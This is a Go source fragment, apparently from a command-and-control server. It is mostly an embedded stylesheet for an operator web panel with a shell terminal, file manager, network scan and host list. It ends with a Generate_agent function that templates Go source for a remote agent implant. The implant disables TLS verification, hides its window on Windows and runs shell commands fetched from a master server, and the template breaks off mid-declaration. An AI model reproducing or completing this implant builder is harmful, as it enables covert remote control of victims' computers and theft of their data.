	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodGet {
			var cssContent string
			if css_file != "" {
				content, err := ioutil.ReadFile(css_file)
				if err != nil {
					fmt.Fprint(w, error_str)
					return
				}
				cssContent = string(content)
			} else {
				cssContent = `html, body {
                    margin: 0;
                    height: 100%;
                    font-family: Arial, sans-serif;
                    display: flex;
                    flex-direction: column;
                }
                .container {
                    display: flex; /* 使用flexbox布局 */
                    width: 100vw; /* 父容器宽度为视口宽度 */
                    height: 100vh; /* 父容器高度为视口高度 */
                }
                .startBtn {
                    background-color:rgb(0, 225, 255);
                    color: white;
                    font-size: 12px;
                    position: absolute;
                    top:auto;
                    left: 186px;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    z-index: 1000;
                }
                .startBtn:hover {
                    background-color:rgb(48, 53, 102);
                } 
                .clearMemoryBtn {
                    background-color:rgb(0, 225, 255);
                    color: white;
                    font-size: 12px;
                    /*靠在最左侧*/
                    position: absolute;
                    top:auto;
                    left: 70px;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                }
                .clearMemoryBtn:hover {
                    background-color:rgb(48, 53, 102);
                }                
                .sidebar {
                    width: 180px;
                    background-color:rgb(187, 210, 226);
                    color: #fff;
                    height: 100%;
                    padding: 20px;
                    box-sizing: border-box;
                    box-shadow: 2px 0 10px rgba(0, 0, 0, 0.2);
                    overflow-y: auto;
                    top: 0;
                    left: 0;
                    position: relative; /* 使 .toggle-button 相对这个父元素定位 */
                    overflow: visible;
                    border-radius: 10px; /* 添加圆角 */
                }
                .sidebar a {
                    color: #000;
                    text-decoration: none;
                    display: block;
                    margin: 10px 0;
                    padding: 10px;
                    border-radius: 4px;
                    transition: background-color 0.2s, transform 0.2s;
                }
                .sidebar-title {
                    font-size: 20px;
                    font-weight: bold;
                    margin-bottom: 10px;
                    color: #000;
                    text-align: center;
                    font-family: 'Arial', sans-serif;
                    margin-bottom: 20px; /* 添加底部间距 */
                }
                .sidebar a i {
                    margin-right: 23px; /* 调整这个值来增加或减少图标和文字之间的距离 */
                }
                .sidebar a:hover {
                    transform: translateX(5px);
                    background-color:rgb(118, 143, 160);
                }
                .content {
                    flex: 1;
                    height: 100vh;
                    padding: 20px;
                    box-sizing: border-box;
                    overflow-y: auto;
                    position: relative; /* 使 .toggle-button 相对这个父元素定位 */
                }
                .content.fullscreen {
                    margin-left: 0; /* 当 sidebar 隐藏时，content 占满整个页面 */
                    width: 100%; /* 确保 content 占据整个屏幕宽度 */
                    height: 100%;
                }
                .serverDialog {
                    position: fixed;
                    background: #fff;
                    border: 5px solid #ccc;
                    padding: 20px;
                    width: 50%;
                    top: 5%;
                    left:25%;
                    max-height: 700px;
                    z-index: 9999;
                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
                    transition: transform 0.3s ease, opacity 0.3s ease;
                    opacity: 0;
                    overflow: auto;
                    display: flex;               /* 新增 */
                    flex-direction: column;     /* 纵向排列子元素 */
                    align-items: center;        /* 水平居中子元素 */
                }
                .serverDialog input {
                    width: 90%;
                    max-height: 60%;
                    margin-bottom: 10px;
                    padding: 5px;
                    box-sizing: border-box; /* 包括内边距和边框在内的宽度和高度 */
                    border: 1px solid #ccc;
                    border-radius: 4px; /* 添加圆角 */
                    font-size: 14px; /* 设置字体大小 */
                    background-color: #f9f9f9; /* 设置背景颜色 */
                    overflow: auto; /* 允许滚动 */
                    margin-left: auto;
                    margin-right: auto;
                }
                .serverDialog textarea {
                    width: 90%;
                    height: 30px;
                    resize: none; /* 禁止调整大小 */
                }
                .log {
                    height: 200px;
                    background-color:rgb(227, 216, 216);
                    color: #00000;
                    font-size: 15px;
                    box-sizing: border-box;
                    overflow: auto; /* 允许滚动 */
                    display: flex;
                    flex-direction: column; /* 更改为上下分布 */
                    position: fixed; /* 固定位置 */
                    bottom: 0;
                    left: 180px; /* 侧边栏的宽度 */
                    width: 100%; /* 全宽减去侧边栏宽度 */
                    overflow-y: auto;
                    padding-left: 5px;
                    padding-right: 5px;
                    border-radius: 10px; /* 添加圆角 */
                }
                #log-content {
                    flex: 1; /* 占据剩余的高度 */
                    overflow-y: auto;
                    box-sizing: border-box;
                }
                /* 自定义滚动条样式 */
                #log-content::-webkit-scrollbar {
                    width: 8px; /* 滚动条宽度 */
                }
                
                #log-content::-webkit-scrollbar-track {
                    background: #f1f1f1; /* 滚动条轨道背景色 */
                }
                
                #log-content::-webkit-scrollbar-thumb {
                    background: #888; /* 滚动条滑块背景色 */
                    border-radius: 10%; /* 滑块圆角 */
                }
                
                #log-content::-webkit-scrollbar-thumb:hover {
                    background: #555; /* 滑块悬停时背景色 */
                }
                #log .resize-handle {
                    width: 100%;
                    height: 10px;
                    top: 0px;
                    background-color: transparent;
                    position: sticky; /* 固定 handle 在 log 容器的底部 */
                    bottom: 0;
                    z-index: 10;
                    cursor: ns-resize;
                }
                .hidden {
                    display: none;
                }
                .toggle-button {
                    top: 10px;
                    width: 40px;
                    height: 40px;
                    position: absolute; /* 相对于 .sidebar 定位 */
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    border-radius: 50%;
                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                    font-size: 24px;
                    z-index: 1000;
                    background-color: #58afff; /* 设置统一的白色背景 */
                }
                .toggle-button::before {
                    content: '☰';
                    display: block;
                    text-align: center;
                    line-height: 40px;
                }
                .sidebar, .toggle-button {
                    transition: transform 0.3s ease-in-out;
                }
                .iframe-panel {
                    position: absolute; /* 使用绝对定位 */
                    top: 100px; /* 初始位置 */
                    left: 100px; /* 初始位置 */
                    width: 60%;
                    height: 80%;
                    border: 1px solid #ccc;
                    background: #fff;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    z-index: 1000;
                    display: none; /* 默认隐藏 */
                }
                .iframe-panel .close-button {
                    position: absolute;
                    top: 5px;
                    right: 5px;
                }
                .iframe-panel .drag-handle {
                    width: 100%;
                    height: 30px; /* 固定高度 */
                    background-color: #f1f1f1;
                    cursor: move;
                    position: absolute;
                    top: 0;
                    left: 0;
                    z-index: 1005;
                }
                .iframe-panel iframe {
                    position: absolute;
                    top: 30px; /* 避开 drag-handle */
                    width: 100%;
                    height: calc(100% - 30px); /* 减去 drag-handle 的高度 */
                    border: none;
                }
                .close-button {
                    position: absolute;
                    top: 0px;
                    height: 23px;
                    right: 5px;
                    cursor: pointer;
                    background-color: #f00; /* 使用 background-color 代替 background */
                    color: #fff;
                    border: none;
                    padding: 5px 10px;
                    border-radius: 3px; /* 添加圆角 */
                    font-size: 14px; /* 设置字体大小 */
                    z-index: 1010; /* 确保 z-index 一致 */
                }
                .close-button:hover {
                    background-color: #d00; /* 添加悬停效果 */
                }
                /* 当 sidebar 隐藏时，按钮移动到页面的左上角 */
                .toggle-button.left {
                    left: 10px;
                }
                /* 新增隐藏状态时的样式 */
                .sidebar.hidden {
                    transform: translateX(-100%);
                }
                #log.hidden {
                    display: none; /* 隐藏log */
                }
                .content.fullscreen {
                    margin-left: 0;
                }
                .tle-sidebar {
                    display: none; /* 初始隐藏 */
                }
                .tel-toggleBtn {
                    display: none; /* 初始隐藏 */
                }
                /* 为移动设备设置 sidebar 的宽度 */
                @media (max-width: 768px) {
                    .sidebar {
                        display: none; /* 为移动端设置较窄的 sidebar */
                    }
                    .sidebar-title{
                        font-size: 16px;
                        font-weight: bold;
                        margin-bottom: 10px;
                        color: #000;
                        text-align: center;
                        font-family: 'Arial', sans-serif;
                        font-style: italic; /* 斜体 */
                        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); /* 添加阴影 */
                        background-color: #fff; /* 设置背景颜色 */
                        padding: 5px; /* 添加内边距 */
                    }
                    .toggle-button{
                        display: none;
                    }
                    .log{
                        left: 0px;
                        width: 100%; /* 调整日志部分的宽度 */
                    }
                    .tle-sidebar {
                        display: none; /* 初始隐藏 */
                        background: #f4f4f4;
                        padding: 10px;
                        border: 1px solid #ccc;
                        width: 200px;
                        position: absolute;
                        top: 50px;
                    }
                    .tel-toggleBtn {
                        display: block; /* 移动端显示按钮 */
                        padding: 10px 15px;
                        background: #007bff;
                        color: white;
                        border: none;
                        cursor: pointer;
                        font-size: 16px;
                        width: 50px;
                    }
                    .tel-toggleBtn:hover {
                        background: #0056b3;
                    }
                }
                .server-container {
                    display: flex;
                    align-items: center;
                    justify-content: flex-start; /* 使子元素水平排列 */
                    border: 1px solid #ccc;
                    padding: 7px;
                    margin: 5px 0;
                    border-radius: 5px;
                    background-color: #f9f9f9;
                    width: 95%;
                    flex-wrap: wrap; /* 允许子元素换行 */
                }
                .server-container > * {
                                    /* 确保子元素适应父容器宽度 */
                                    max-width: 100%;
                                    flex-shrink: 0; /* 防止子元素压缩 */
                                }
                .conn-container {
                    display: flex;
                    align-items: center;
                    justify-content: flex-start; /* 使子元素水平排列 */
                    border: 1px solid #ccc;
                    padding: 7px;
                    margin: 5px 0;
                    border-radius: 5px;
                    background-color: #f9f9f9;
                    width: 95%;
                    flex-wrap: wrap; /* 允许子元素换行 */
                }
                .conn-container > * {
                                    /* 确保子元素适应父容器宽度 */
                                    max-width: 100%;
                                    flex-shrink: 0; /* 防止子元素压缩 */
                                }
                .ip-container {
                    display: flex;
                    align-items: center;
                    border: 1px solid #ccc;
                    padding: 10px;
                    margin: 10px 0;
                    border-radius: 5px;
                    background-color: #f9f9f9;
                    max-width: 800px;
                }
                .os-container{ 
                    display: flex;
                    align-items: center;
                    padding: 10px;
                    margin-left: auto;
                    background-color: #f9f9f9;
                }
                .host-container{
                    white-space: nowrap; /* 防止内部元素换行 */
                }
                .ip-address, .online-time, .shell-address {
                    display: inline-block;
                    margin-right: 10px;
                    font-size: 1em;
                    font-weight: bold;
                }
                .let-it-in-button {
                    padding: 8px 12px;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    background-color: #4CAF50;
                    color: white;
                    display: inline-block;
                    margin-right: 10px;
                }
                .button-container {
                    width: 40%;
                }
                .server-info {
                    display: inline-block;
                    background: #fff;
                    padding: 10px;
                    width: 915px;
                    top-margin: 35px;
                    margin: 15px;
                    margin-left: 50px;  /* 将元素推到右边 */
                    border-radius: 8px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                    align-items: center;
                    border: none;
                }
                .ip-info {
                    display: inline-block;
                    background: #fff;
                    padding: 10px;
                    width: 1100px;
                    margin: 10px;
                    margin-left: 50px;  /* 将元素推到右边 */
                    border-radius: 8px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                    align-items: center;
                    border: none;
                }
                .info-content {
                    display: none;
                    margin-top: 10px;
                    padding: 10px;
                    background-color: #f0f0f0;
                    border-radius: 5px;
                }
                /* 让 info-content 内部的 p 标签变成 flex 布局，左右对齐 */
                .info-content p {
                    display: flex;
                    align-items: flex-start; /* 让左侧和右侧内容上对齐 */
                    gap: 10px; /* 左右内容间距 */
                    margin: 5px 0;
                }
                /* 统一左侧 strong 的样式 */
                .s_left {
                    font-size: 14px;
                    width: 120px; /* 设定统一宽度，保证左侧对齐 */
                    text-align: left;
                    flex-shrink: 0; /* 防止左侧文本被压缩 */
                    margin-right: 20px;
                }
                /* 右侧文本和输入框统一 */
                .s_right {
                    font-size: 14px;
                    text-align: left;
                    word-break: break-all; /* 让长内容自动换行 */
                }
                /* 右侧 input 统一样式 */
                input.s_right_input.custom-remarks {
                    font-size: 14px;
                    height: 20px; /* 设置固定高度，避免太高 */
                    line-height: 20px; /* 确保文字居中 */
                    text-align: left;
                    background-color: transparent;
                    border: none !important; /* 强制去掉边框 */
                    outline: none !important; /* 去掉聚焦时的默认高亮 */
                    box-shadow: none !important; /* 去掉可能的默认阴影 */
                    appearance: none; /* 禁用某些浏览器默认样式 */
                    -webkit-appearance: none; /* 兼容 Webkit 内核浏览器 */
                    -moz-appearance: none; /* 兼容 Firefox */
                    padding: 0; /* 避免额外的内边距撑高输入框 */
                }               
                input.s_right_input.custom-remarks:focu {
                    outline: none;
                    border: none;
                    box-shadow: none;
                    -webkit-tap-highlight-color: transparent; /* 禁止移动端高亮 */
                }                
                /* 显示时的样式 */
                .info-content.show {
                    display: block;
                }
                .choose-content {
                    display: none;              /* 初始隐藏 */
                    flex-wrap: wrap;            /* 子项自动换行 */
                    gap: 8px;

                    margin-top: 10px;
                    padding: 10px;
                    background-color: #f0f0f0;
                    border-radius: 5px;
                    max-width: 100%;

                    box-sizing: border-box;
                    overflow-x: hidden;
                }

                /* 显示时的类 */
                .choose-content.show {
                    display: flex;
                }
                @media (max-width: 768px) {
                    .s_left {
                        font-size: 12px; /* 调整左侧字体大小 */
                        width: auto; /* 宽度自适应 */
                        margin-right: 10px; /* 缩小右侧间距 */
                    }
                
                    .s_right {
                        font-size: 12px; /* 调整右侧文本大小 */
                        margin-left: 0; /* 去掉左侧间距 */
                    }
                
                    input.s_right_input.custom-remarks {
                        font-size: 14px; /* 调整输入框文字大小 */
                        height: 15px; /* 调整高度适应手机 */
                        line-height: 30px; /* 确保文字居中 */
                        padding-left: 5px; /* 添加左内边距 */
                    }
                
                    .info-content {
                        padding: 8px; /* 手机端调整内边距 */
                    }
                }
                
                /* 更小的手机端适配 */
                @media (max-width: 480px) {
                    .s_left {
                        font-size: 10px; /* 更小的字体 */
                    }
                
                    .s_right {
                        font-size: 10px; /* 更小的字体 */
                    }
                
                    input.s_right_input.custom-remarks {
                        font-size: 10px; /* 更小的字体 */
                        height: 28px; /* 调整高度 */
                        line-height: 28px; /* 确保文字居中 */
                    }
                }
                .ip-address, .action-button, .console-link {
                    margin-right: 3.5px; /* 元素之间的间隔 */
                    white-space: nowrap;  /*防止换行 */
                    border: none; /* 去掉边框 */
                }
                .ip-container {
                    font-size: 14px;
                    color: #007BFF;
                    margin: 18px;
                }
                .ip-address {
                    font-size: 12px;
                    color: #555;
                    margin-right: 8px;
                }
                .host-name { /* 主机名特殊样式 */
                    font-weight: bold; /* 加粗显示 */
                }
                .action-button {
                    padding: 5px 10px;
                    border-radius: 5px;
                    cursor: pointer;
                    justify-content: center;
                    gap: 25px; /* 按钮之间的间距 */
                    font-size: 12px;
                    background-color: #ccc; /* 浅灰色 */
                    color: #fff;
                    border: none; /* 去掉按钮边框 */
                    transition: background-color 0.3s; /* 平滑过渡效果 */
                }
                .action-button:hover {
                    background-color: #fff; /* 鼠标悬浮时背景变为白色 */
                    color: #333; /* 鼠标悬浮时文字颜色变为深色 */
                }
                .console-link {
                    justify-content: center;
                    gap: 25px; /* 按钮之间的间距 */
                    text-decoration: none; /* 去掉下划线 */
                    color: #007BFF; /* 设置链接颜色 */
                    font-size: 12px; /* 设置字体大小 */
                    margin-left: 5px; /* 设置与前一个元素的间隔 */
                    border: none; /* 去掉边框 */
                    padding: 8px 15px; /* 设置内边距 */
                    border-radius: 4px; /* 设置边框圆角 */
                    background-color: #f8f9fa; /* 设置背景颜色 */
                    transition: background-color 0.3s, color 0.3s; /* 平滑过渡效果 */
                    cursor: pointer; /* 鼠标悬停时显示手形图标 */
                    outline: none; /* 点击时不显示轮廓 */
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* 添加阴影效果 */
                }
                .console-link:hover,
                .console-link:focus {
                    background-color: #0069d9; /* 鼠标悬停或聚焦时的背景颜色 */
                    color: white; /* 文字颜色 */
                    text-decoration: none; /* 鼠标悬停时不显示下划线 */
                    }
                .console-link:active {
                    background-color: #0062cc; /* 鼠标按下时的背景颜色 */
                    box-shadow: none; /* 移除阴影 */
                }
                .external-address {
                    margin-left: 5px; /* 与前面的元素保持间隔 */
                    border: none; /* 去掉边框 */
                }
                .external-address .ip-address {
                    margin-left: 10px; /* 与前面的按钮保持间隔 */
                }
                .server_form {
                    background: #fff;
                    padding: 10px;
                    width: 95%;
                    border-radius: 8px;
                    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
                    display: flex;
                    flex-direction: row; /* 横向排列 */
                    gap: 3px; /* 元素之间的间距 */
                    align-items: center; /* 元素垂直居中 */
                    margin-left: 20px;
                }
                .keyput{
                    width: 20px;
                    height: 20px;
                    opacity: 0;
                    position: absolute;
                    z-index: -1;
                }
                .custom-file-upload {
                    display: inline-block;
                    padding: 6px 12px;
                    cursor: pointer;
                    background-color: #007bff;
                    color: #fff;
                    border-radius: 5px;
                    font-size: 14px;
                    font-weight: bold;
                    text-align: center;
                    border: none;
                    transition: background-color 0.3s ease;
                }
                .custom-file-upload:hover {
                    background-color: #0056b3;
                }
                /* 让按钮看起来更像其他输入框 */
                .file-upload-container {
                    display: flex;
                    align-items: center;
                    gap: 5px;
                }                
                .form {
                    background: #fff;
                    padding: 10px;
                    width: 100%;
                    border-radius: 8px;
                    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
                    display: flex;
                    flex-direction: row; /* 横向排列 */
                    gap: 15px; /* 元素之间的间距 */
                    align-items: center; /* 元素垂直居中 */
                }input[type="text"] {
                    width: 45%; /* 输入框宽度调整 */
                    padding: 10px;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                    font-size: 14px;
                    transition: border-color 0.3s;
                }
                input[type="text"]:focus {
                    border-color: #007BFF;
                    outline: none;
                }
                label {
                    font-size: 14px;
                    color: #333;
                }
                select {
                    width: 25%; /* 下拉菜单宽度调整 */
                    padding: 10px;
                    border: 1px solid #ddd;
                    border-radius: 5px;
                    font-size: 14px;
                    background-color: #fff;
                    transition: border-color 0.3s;
                }
                select:focus {
                    border-color: #007BFF;
                    outline: none;
                }
                button {
                    padding: 10px 15px;
                    background-color: #007BFF;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 14px;
                    transition: background-color 0.3s;
                }
                button:hover {
                    background-color: #0056b3;
                }
                #div_index {
                    margin-top: 15px;
                }
                /* 为移动设备设置 sidebar 的宽度 */
                @media (max-width: 768px) {
                    .ip-container {
                        flex-direction: column; /* 垂直排列，避免元素拥挤 */
                        padding: 5px; /* 减少内边距 */
                    }
                    .server-info {
                        max-width: 400px; /* 让 ip-info 在移动端填满整个屏幕 */
                        margin: 0;
                    }
                    .ip-info {
                        max-width: 400px; /* 让 ip-info 在移动端填满整个屏幕 */
                        margin: 0;
                    }
                    .server-container {
                        flex-direction: row; /* 确保子元素在一行内 */
                        flex-wrap: wrap; /* 允许换行 */
                        max-width: 100%; /* 防止超出 */
                        overflow: hidden; /* 避免溢出 */
                        background-color: #f9f9f9;
                    }
                    .conn-container {
                        flex-direction: row; /* 确保子元素在一行内 */
                        flex-wrap: wrap; /* 允许换行 */
                        max-width: 100%; /* 防止超出 */
                        overflow: hidden; /* 避免溢出 */
                        background-color: #f9f9f9;
                    }
                    .os-container {
                        display: flex;
                        align-items: center;
                        padding: 10px;
                        background-color: #f9f9f9;
                        margin-left: 0; /* 取消自动推到右侧 */
                    }                    
                    .ip-address, .action-button, .console-link {
                        margin-right: 0; /* 移动端去掉右侧的间隔 */
                        margin-bottom: 10px; /* 元素之间增加垂直间隔 */
                        font-size: 14px; /* 调整字体大小 */
                    }
                    .action-button, .console-link {
                        width: 100%; /* 在移动设备上按钮占满整个行 */
                        text-align: center; /* 按钮内文字居中 */
                    }
                    .host-name, .ip-address {
                        font-size: 14px; /* 调整主机名和 IP 的字体大小 */
                    }
                    .let-it-in-button {
                        width: 100%; /* 按钮宽度 100% 占据一整行 */
                        margin-bottom: 10px;
                    }
                    .server_form{
                        background: #fff;
                        padding: 10px;
                        width: 100%;
                        border-radius: 8px;
                        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
                        display: flex;
                        flex-direction: row; /* 横向排列 */
                        align-items: center; /* 元素垂直居中 */
                        margin: 0 auto;
                    }
                    .custom-file-upload {
                        display: inline-block;
                        padding: 3px 6px;
                        cursor: pointer;
                        background-color: #007bff;
                        color: #fff;
                        border-radius: 5px;
                        font-size: 7px;
                        font-weight: bold;
                        text-align: center;
                        border: none;
                        transition: background-color 0.3s ease;
                    }
                    .form {
                        background: #fff;
                        padding: 10px;
                        width: 100%;
                        border-radius: 8px;
                        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
                        display: flex;
                        flex-direction: row; /* 横向排列 */
                        gap: 15px; /* 元素之间的间距 */
                        align-items: center; /* 元素垂直居中 */
                    }
                    .button-container {
                        width: 40%;
                    }
                }
                .net_div {
                    height: 20%;
                    background-color: lightgray; /* 添加背景色以便于查看 */
                }
                .net_scan{
                    display: flex;
                    gap: 10px; 
                    margin-bottom: 2%;
                }
                .net_div_son {
                    background-color: #f9f9f9; /* 浅灰色背景 */
                    border: 1px solid #ddd; /* 轻微的边框 */
                    border-radius: 5px; /* 圆角边框 */
                    box-shadow: 0 2px 4px rgba(0,0,0,0.1); /* 轻微的阴影，增加层次感 */
                    padding: 15px; /* 内边距 */
                    margin-bottom: 10px; /* 与下一个元素的间距 */
                    transition: transform 0.3s ease, box-shadow 0.3s ease; /* 动态效果 */
                }
                .net_div_son:hover {
                    transform: translateY(-3px); /* 鼠标悬停时轻微上移 */
                    box-shadow: 0 4px 8px rgba(0,0,0,0.2); /* 鼠标悬停时更深的阴影 */
                }
                .net_div_son strong {
                    color: #333; /* 强调文字颜色 */
                    margin-right: 5px; /* 与内容的间距 */
                }
                .net_div_son hr {
                    border: 0; /* 移除边框 */
                    height: 1px; /* 高度 */
                    background-color: #eaeaea; /* 颜色 */
                    margin: 10px 0; /* 与内容的间距 */
                }
                .net_div_son button {
                    margin-left: auto; /* 按钮靠右 */
                    min-height: 60%;
                }
                #have_ip {
                    display: flex; /* 设置为flex布局 */
                    flex-wrap: wrap; /* 允许子元素自动换行 */
                    gap: 10px; /* 设置子元素之间的间距 */
                    margin-top: 10px; /* 与选择框的间距 */
                    font-family: 'Arial', sans-serif; /* 设置字体 */
                    margin-left: 15px;
                }
                #have_ip div {
                    background-color: #f0f0f0; /* 浅灰色背景 */
                    border: 1px solid #ddd; /* 边框颜色 */
                    border-radius: 4px; /* 圆角边框 */
                    padding: 5px 10px; /* 内边距 */
                    display: inline-block; /* 内联块级元素 */
                }
                #have_ip div:hover {
                    background-color: #e0e0e0; /* 鼠标悬停时的背景颜色 */
                    cursor: pointer; /* 鼠标悬停时的光标样式 */
                }
                .filecontainer {
                    max-width: 1200px;
                    margin: 20px auto;
                    padding: 20px;
                    background-color: white;
                    border-radius: 8px;
                    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                }
                .file-manager {
                    display: flex;
                    flex-wrap: wrap;
                    justify-content: center;
                    gap: 10px;
                    margin-top: 20px;
                }
                .directory, .file {
                    display: flex;
                    align-items: center;
                    padding: 10px;
                    width: calc(50% - 10px);
                    background-color: white;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    cursor: pointer;
                    text-decoration: none;
                    color: inherit;
                    transition: box-shadow 0.3s, transform 0.3s;
                }
                .directory:hover, .file:hover {
                    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
                    transform: translateY(-2px);
                }
                .icon {
                    font-size: 1.5em;
                    margin-right: 10px;
                    color: #555;
                }
                .dir-btn {
                    padding: 10px 20px;
                    font-size: 1em;
                    color: #fff;
                    background-color: #007bff;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background-color 0.3s, transform 0.3s;
                    text-transform: uppercase;
                    letter-spacing: 0.05em;
                    margin-bottom: 1%;
                }
                .dir-btn:hover {
                    background-color: #0056b3;
                }
                .dir-btn:active {
                    background-color: #004085;
                    transform: translateY(2px);
                }
                #cur_dir {
                    background-color: #f9f9f9;
                    border: 1px solid #e1e4e8;
                    border-radius: 8px;
                    padding: 15px 20px;
                    margin: 20px 0;
                    font-size: 16px;
                }
                #cur_dir_p{
                    margin-right: 2%;
                }
                #uploadForm {
                    margin-bottom: 20px;
                    justify-content: center;
                    align-items: center;
                    display: flex;
                    flex-direction: column;  /* 垂直排列 */
                    gap: 10px;
                }
                .fileinput{
                    padding: 10px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    cursor: pointer;
                }
                #uploadForm input[type="submit"] {
                    padding: 10px 20px;
                    font-size: 1em;
                    color: #fff;
                    background-color: #007bff;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background-color 0.3s;
                }
                #uploadForm input[type="submit"]:hover {
                    background-color: #0056b3;
                }
                #uploadForm input[type="submit"]:active {
                    background-color: #004085;
                    transform: translateY(2px);
                }
                .dir-controls {
                    display: flex;       /* 使用flex布局 */
                    align-items: center; /* 垂直居中对齐子元素 */
                    margin-top: 20px;   /* 根据需要调整上边距 */
                }
                    /* 输入框样式 */
                #directoryInput {
                    padding: 10px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    font-size: 16px;
                    margin-right: 10px; /* 与按钮保持间距 */
                    width: 200px; /* 设置一个合适的宽度 */
                    transition: border-color 0.3s, box-shadow 0.3s;
                }
                #directoryInput:focus {
                    border-color: #007bff;
                    box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
                    outline: none; /* 移除默认的焦点轮廓 */
                }
                /* 按钮样式 */
                #moveDirButton {
                    padding: 10px 20px;
                    font-size: 16px;
                    color: #fff;
                    background-color: #007bff;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background-color 0.3s, transform 0.3s;
                }
                #moveDirButton:hover {
                    background-color: #0056b3;
                }
                #moveDirButton:active {
                    background-color: #004085;
                    transform: translateY(2px);
                }
                /* 响应式设计 */
                @media (max-width: 768px) {
                    .directory, .file {
                        width: calc(100% - 10px);
                    }
                }
                
                
                .shell-container {
                    display: flex; /* 使用 flexbox 布局 */
                    align-items: center; /* 垂直居中对齐 */
                    top: 0;
                }
                .terminal {
                    width: 100%;
                    height: 100vh;
                    border: 1px solid rgb(242, 166, 254);
                    padding: 10px;
                    box-sizing: border-box;
                    overflow-y: auto;
                    background-color: #dfdfdf;
                    box-shadow: 0 0 10px rgb(202, 250, 172);
                }
                .shell-input {
                    width: calc(100% - 30px);
                    border: none;
                    background: transparent;
                    color: #000;
                    outline: none;
                    font-size: 16px;
                    margin-left: 5px;
                }
                .prompt {
                    color: #000;
                    display: inline-block;
                    width: 30px;
                    font-size: 12px;
                }
                .input-container {
                    margin-top: 10px;
                }
                .output {
                    white-space: pre-wrap;
                    margin: 5px 0;
                    font-size: 12px;
                }
                .form-in {
                    background-color: #ffffff;
                    padding: 30px; 
                    border-radius: 10px;
                    box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2); 
                    width: 300px;
                    height: auto; 
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                     /* 绝对定位 */
                     position: absolute;
                     top: 50%; /* 距离页面顶部 50% */
                     left: 50%; /* 距离页面左侧 50% */
                     transform: translate(-50%, -50%); /* 使用 transform 来居中 */
                }
                .form-in input[type="text"],
                .form-in input[type="password"] {
                    width: 100%; 
                    padding: 10px; /* 增加内边距 */
                    margin: 10px 0; /* 增加垂直方向的间距 */
                    border-radius: 5px; /* 设置输入框的圆角 */
                    border: 1px solid #ccc; /* 边框颜色 */
                    font-size: 16px; /* 设置字体大小 */
                    box-sizing: border-box; /* 包含内边距和边框 */
                }
                .form-in button {
                    width: 100%; 
                    padding: 10px; /* 增加内边距 */
                    background-color: #ffaec6; 
                    color: white; /* 按钮文字颜色 */
                    border: none;
                    border-radius: 5px;
                    font-size: 16px; /* 字体大小 */
                    cursor: pointer; 
                    margin-top: 10px; /* 按钮与输入框之间的间距 */
                    transition: background-color 0.3s ease; /* 添加平滑过渡效果 */
                }
                .form-in button:hover {
                    background-color: #ff75ba; /* 悬停时的背景颜色 */
                }
                .form-in h1 {
                    font-size: 24px; /* 设置标题的字体大小 */
                    margin-bottom: 20px; /* 标题与输入框之间的间距 */
                    color: #333; /* 标题颜色 */
                }`
        }
        w.Header().Set("Content-Type", "text/css")
        fmt.Fprint(w, cssContent)
        }
    }
}
func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,switch_key,encry_key,download,result,_net,info,upload,list,option,Username,user,uid,hostname,keyPart,filekey,code string) string {
	//如果参数有一个为空
    if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || encry_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || code == "" {
        return "parameter null"
    }
    var protocol_str, os_str, main_str, sys_str, tls_str,package_str string
	if protocol == "https" {
		protocol_str = "TLSClientConfig: &tls.Config{InsecureSkipVerify: true,},"
		tls_str = `"crypto/tls"`
	} else {
		tls_str = ""
	}
	if os == "win" {
		os_str = `command := exec.Command(version, "/C", cmd);command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true,};var stdout bytes.Buffer;command.Stdout = &stdout;command.Run();return stdout.String()`
		sys_str = `"syscall"`
	} else {
		os_str = `cmdObj := exec.Command(version, "-c", cmd);result, err := cmdObj.CombinedOutput();if err != nil {return ""};return string(result)`
		sys_str = ""
	}
	if os == "android" {
		main_str = ""
        package_str = "run"
	} else {
		main_str = "func main(){run()}"
        package_str = "main"
	}
	protocol_var :="\""+protocol + "://\""
    s_server := "\""+server+"\""
    u_username := "\""+Username+"\""
    o_os := "\""+os+"\""
    agents := `package /*package_str*/
    import (
        "math"
        "bytes"
        "math/rand"
        "io"
        "io/ioutil"
        "net/http"
        "net"
        "os"
        "os/exec"
        "strings"
        "time"
        "mime/multipart"
        "strconv"
        "encoding/base64"
        "sync"
        /*sys_str*/
        /*tls_str*/
    )
    var(
        osname = /*os*/
        protocol = /*protocol_var*/
        uid string
        version string
        clientname string
        delay int8 = 30
        waitTime int = 3
        onece bool = true
        user string = /*Username*/
        master string = /*server*/
        key string
